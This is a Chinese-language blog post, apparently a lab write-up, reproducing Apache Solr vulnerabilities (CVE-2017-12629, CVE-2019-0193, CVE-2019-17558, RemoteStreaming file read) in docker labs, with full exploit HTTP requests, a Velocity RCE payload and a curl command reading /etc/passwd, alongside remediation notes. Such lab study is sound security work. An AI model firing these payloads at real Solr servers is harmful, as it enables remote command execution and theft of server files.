@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Solr漏洞学习 | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Solr漏洞学习</h2>
+  <p class="post-date">2021-03-25</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>现在已是Web时代，必然涉及到“搜索”，高效搜索、处理海量信息等功能；而以上功能必然需要搜索引擎的支持。我们不能使用Bing、Google等搜索内部资源信息，毕竟提供外部的Web需要让用户搜索是基于站内的资源检索并显示。</p>
+<p>Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。</p>
+<p>Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。Solr是一个独立的企业级搜索应用服务器，很多企业运用solr开源服务。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。</p>
+<p>与Solr服务器通信的唯一协议是HTTP，并且默认情况下无需身份验证即可访问，所以Solr容易受到web攻击(SSRF，CSRF等)。</p>
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>高效、灵活的缓存功能，垂直搜索功能，高亮显示搜索结果，通过索引复制来提高可用性，提 供一套强大Data Schema来定义字段，类型和设置文本分析，提供基于Web的管理界面等。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>docker拉取</p>
+<p><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/lucene/solr/7.1.0/">Solr</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">JDK</a></p>
+<p>jdk8 否则会报错</p>
+<p><img src="/images/Solr/image-20210318140506574.png" alt="image-20210318140506574"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">solr.cmd -p 8983</span><br><span class="line"># 端口指定</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210318142640465.png" alt="image-20210318142640465"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/#/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210318143129746.png" alt="image-20210318143129746"></p>
+<p>新建<code>Core</code></p>
+<p><img src="/images/Solr/image-20210318143306577.png" alt="image-20210318143306577"></p>
+<h3 id="漏洞实战分类"><a href="#漏洞实战分类" class="headerlink" title="漏洞实战分类"></a>漏洞实战分类</h3><h4 id="CVE-2017-12629"><a href="#CVE-2017-12629" class="headerlink" title="CVE-2017-12629"></a>CVE-2017-12629</h4><h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>此CVE共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE）。</p>
+<p>XXE</p>
+<p>Lucene包括一个使用XML数据结构创建全功能Lucene查询的解析器。从5.1版本开始，在Sorl的搜索查询中就开始支持xml查询。而出现漏洞的关键点在于Lucene的XML解析器没有明确禁止外部实体的DOCTYPE声明和扩展，造成可以在XML文档中包含指向外部文件(file:// )或者外部URL(http:// )的特殊实体。</p>
+<p>RCE</p>
+<p>Solr的<code>RunExecutableListener</code>类可用于对特定事件执行任意命令，例如在每次更新查询后执行(<code>postCommit</code>)。该漏洞的问题点在于这样的监听器可以通过带有<code>add-listener</code>命令的<code>Config API</code>来启用任意参数。</p>
+<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>Apache Solr &lt;= 7.1.0</p>
+<p>Apache Lucene &lt;= 7.1</p>
+<p>Apache-Solr &lt; 7.1 版本受rce攻击影响</p>
+<p>XXE漏洞影响版本在5.1-7.0.1</p>
+<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>XXE</p>
+<p>Lucene包括一个使用XML数据结构创建全功能Lucene查询的解析器。从5.1版本开始，在Sorl的搜索查询中就开始支持xml查询。而出现漏洞的关键点在于Lucene的XML解析器没有明确禁止外部实体的DOCTYPE声明和扩展，造成可以在XML文档中包含指向外部文件(file:// )或者外部URL(http:// )的特殊实体。</p>
+<p>RCE</p>
+<p>Solr的<code>RunExecutableListener</code>类可用于对特定事件执行任意命令，例如在每次更新查询后执行(<code>postCommit</code>)。该漏洞的问题点在于这样的监听器可以通过带有<code>add-listener</code>命令的<code>Config API</code>来启用任意参数。</p>
+<h5 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Apache Solr &lt;= 7.1.0</p>
+<p>Apache Lucene &lt;= 7.1</p>
+<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、XXE检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8983&#x2F;solr&#x2F;#&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210315201603729.png" alt="image-20210315201603729"></p>
+<p>2、nc监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>3、URL请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8983&#x2F;solr&#x2F;demo&#x2F;select?q&#x3D;&#123;!xmlparser%20v&#x3D;%27%3C!DOCTYPE%20a%20SYSTEM%20%22http:&#x2F;&#x2F;192.168.20.120:4444&#x2F;si1ent%22%3E%3Ca%3E%3C&#x2F;a%3E%27&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210318194813420.png" alt="image-20210318194813420"></p>
+<center>发现XML请求响应数据</center>
+
+<p>4、创建集合</p>
+<p>（docker里已经包含demo的集合，这里直接使用，如还不存在集合请执行以下命令。）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8983&#x2F;solr&#x2F;admin&#x2F;collections?action&#x3D;CREATE&amp;name&#x3D;si1ent&amp;numShards&#x3D;2&amp;maxShardsPerNode&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.20.120:8983</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;add-listener&quot;</span>:&#123;</span><br><span class="line">		<span class="attr">&quot;event&quot;</span>:<span class="string">&quot;postCommit&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;newlistener&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;class&quot;</span>:<span class="string">&quot;solr.RunExecutableListener&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;exe&quot;</span>:<span class="string">&quot;sh&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;dir&quot;</span>:<span class="string">&quot;/bin/&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;args&quot;</span>:[<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/si1ent&quot;</span>]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210315204440565.png" alt="image-20210315204440565"></p>
+<p>5、执行update更新集合</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/update HTTP/1.1</span><br><span class="line">Host: 192.168.20.120:8983</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">[&#123;<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210315204454993.png" alt="image-20210315204454993"></p>
+<p>6、检测文件是否存在</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  CVE-2017-12629-XXE docker exec 660c555d2410 ls -al /tmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210315204629168.png" alt="image-20210315204629168"></p>
+<center>文件创建完成</center>
+
+<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、升级到7.1最新版本</p>
+<p>2、使用参数-Ddisable.configEdit=true来运行Solr实例</p>
+<p>3、Solr添加授权控制</p>
+<h4 id="CVE-2019-0193"><a href="#CVE-2019-0193" class="headerlink" title="CVE-2019-0193"></a>CVE-2019-0193</h4><h5 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p>
+<h5 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h5><p>Apache Solr &lt; 8.2.0 并且开启了DataImportHandler模块</p>
+<p>Solr&gt;=8.2.0版安全。因为从Solr&gt;=8.2.0版开始，默认不可使用dataConfig参数，想使用此参数需要将Java System属性“enable.dih.dataConfigParam”设置为true。</p>
+<p>只有当Solr&gt;=8.2.0但是主动将Java System属性“enable.dih.dataConfigParam”设置为true，才存在漏洞。</p>
+<h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Apache Solr如果启用了DataImportHandler模块，因为它支持使用web请求来指定配置信息”DIH配置” ，攻击者可构造HTTP请求指定dataConfig参数的值(dataConfig内容)，dataConfig内容完全可控(多种利用方式)，后端处理的过程中，可导致命令执行。</p>
+<h5 id="漏洞条件-1"><a href="#漏洞条件-1" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>1.Apache Solr的DataImportHandler启用了模块DataImportHandler(默认情况下该模块不会被启用)<br>2.Solr Admin UI未开启鉴权认证。（默认情况下打开web界面无需任何认证）</p>
+<h5 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、漏洞环境</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193">CVE-2019-0193</a></p>
+<p><img src="/images/Solr/image-20210324170636036.png" alt="image-20210324170636036"></p>
+<p>2、搭建测试环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210324170739729.png" alt="image-20210324170739729"></p>
+<p>3、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8983&#x2F;solr&#x2F;#&#x2F;test&#x2F;core-overview</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210324170852566.png" alt="image-20210324170852566"></p>
+<p>4、选择”Dataimport”</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;URLDataSource&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="javascript">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>)</span>&#123; java.lang.Runtime.getRuntime().exec(<span class="string">&quot;touch /tmp/si1ent&quot;</span>);</span></span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">&quot;stackoverflow&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">url</span>=<span class="string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">processor</span>=<span class="string">&quot;XPathEntityProcessor&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">forEach</span>=<span class="string">&quot;/feed&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">transformer</span>=<span class="string">&quot;script:poc&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210324171140363.png" alt="image-20210324171140363"></p>
+<p>5、POST数据</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/test/dataimport?_=1616576951258&amp;indent=on&amp;wt=json HTTP/1.1</span><br><span class="line">Host: 192.168.20.120:8983</span><br><span class="line">Content-Length: 678</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Origin: http://192.168.20.120:8983</span><br><span class="line">Referer: http://192.168.20.120:8983/solr/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: splunkweb_csrf_token_8000=6133015747182714908; token_key=6133015747182714908; experience_id=f7332b8b-9a06-84d7-c53a-b89a0d7efc2b; splunkweb_uid=BE681E15-3305-475F-BFD1-FC703F11B8CF; has_js=1; SESS555e2c409fffd33b4705e938aa8ef008=llJrPLtJzAA90iuIsYDJiWKpb9h6pnD6yqNoxE5iBkU; Drupal.toolbar.collapsed=0</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">command=full-import&amp;verbose=false&amp;clean=false&amp;commit=true&amp;debug=true&amp;core=test&amp;dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsi1ent%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&amp;name=dataimport</span><br></pre></td></tr></table></figure>
+
+<p>6、查看PoC测试结果</p>
+<p><img src="/images/Solr/image-20210324172032073.png" alt="image-20210324172032073"></p>
+<center>命令执行成功</center>
+
+<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、更新至最新版本</p>
+<h4 id="CVE-2019-17558"><a href="#CVE-2019-17558" class="headerlink" title="CVE-2019-17558"></a>CVE-2019-17558</h4><h5 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>在其 5.0.0 到 8.3.1版本中，用户可以注入自定义模板，通过Velocity模板语言执行任意命令。</p>
+<p>默认情况下<code>params.resource.loader.enabled</code>配置未打开，无法使用自定义模板。我们先通过如下API获取所有的核心：</p>
+<h5 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h5><p> 5.0.0 到 8.3.1</p>
+<h5 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>在其 5.0.0 到 8.3.1版本中，用户可以注入自定义模板，通过Velocity模板语言执行任意命令。</p>
+<h5 id="漏洞条件-2"><a href="#漏洞条件-2" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>在其 5.0.0 到 8.3.1版本中，用户可以注入自定义模板，通过Velocity模板语言执行任意命令。</p>
+<h5 id="漏洞检测-2"><a href="#漏洞检测-2" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、docker</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/solr/CVE-2019-17558/">docker</a></p>
+<p><img src="/images/Solr/image-20210324200124520.png" alt="image-20210324200124520"></p>
+<p>2、</p>
+<p>默认情况下<code>params.resource.loader.enabled</code>配置未打开，无法使用自定义模板。我们先通过如下API获取所有的核心：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210324200218119.png" alt="image-20210324200218119"></p>
+<p>3、</p>
+<p>通过如下请求开启<code>params.resource.loader.enabled</code>，其中API路径包含刚才获取的core名称：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.20.120:8983</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>4、注入Velocity模板即可执行任意命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8983&#x2F;solr&#x2F;demo&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210324200600751.png" alt="image-20210324200600751"></p>
+<center>如上所示命令执行成功</center>
+
+<h5 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、更新至最新版本</p>
+<h4 id="Solr任意文件读取"><a href="#Solr任意文件读取" class="headerlink" title="Solr任意文件读取"></a>Solr任意文件读取</h4><h5 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Apache Solr的某些功能存在过滤不严格，在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或文件读取漏洞。</p>
+<h5 id="漏洞范围-1"><a href="#漏洞范围-1" class="headerlink" title="漏洞范围"></a>漏洞范围</h5><p>Apache Solr &lt;= 8.8.1</p>
+<h5 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>在未开启认证的情况下，攻击者可直接构造特定请求获取目标主机内敏感文件及资源。</p>
+<h5 id="漏洞条件-3"><a href="#漏洞条件-3" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>无</p>
+<h5 id="漏洞检测-3"><a href="#漏洞检测-3" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、docker环境</p>
+<p>最新的Solr</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/solr/Remote-Streaming-Fileread/">Solr任意文件读取</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  Remote-Streaming-Fileread docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>2、URL访问</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.20.120:8983/solr/#/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210325171532705.png" alt="image-20210325171532705"></p>
+<p>3、获取敏感信息</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.20.120:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210325170653561.png" alt="image-20210325170653561"></p>
+<p>4、发送如下数据包，修改数据库<code>demo</code>的配置，开启<code>RemoteStreaming</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Content-Type: application/json&#x27; --data-binary $&#x27;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125;&#x27; \</span><br><span class="line">    $&#x27;http://192.168.20.120:8983/solr/demo/config&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210325170913366.png" alt="image-20210325170913366"></p>
+<p>5、再通过<code>stream.url</code>读取任意文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k &#x27;http://192.168.20.120:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Solr/image-20210325170950983.png" alt="image-20210325170950983"></p>
+<h5 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>官方无修复版本</p>
